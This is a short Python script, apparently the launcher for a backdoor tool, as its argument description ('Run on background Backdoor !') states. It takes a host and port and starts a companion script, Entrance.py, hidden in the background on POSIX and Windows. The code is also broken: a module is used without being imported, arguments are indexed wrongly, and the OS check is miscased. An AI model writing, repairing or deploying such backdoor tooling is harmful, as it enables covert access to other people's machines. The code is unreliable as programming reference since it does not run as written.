import os, argparse
import subprocess as sp


p = argparse.ArgumentParser(description="Run on background Backdoor !")
p.add_argument("--host", help="Host's IP Address to listen with", required=True, type=str)
p.add_argument("--port", help="Port to listen on", required=True, type=int)
args = p.parse_args()
try:
    host = args.host[0]
    port = args.port[0]
    if ipaddress.IPv4Address(host):
        pass
except ipaddress.AddressValueError:
    print("Wrong ip address was given, please try again.")

def running():
    if os.name == "posix":
        sp.run(["python", "Entrance.py", "--host", host, "--port", port, "&"])
    elif os.name == "NT":
        sp.run(["pythonw", "Entrance.py", "--host", host, "--port", port])


if __name__ == '__main__':
    running()
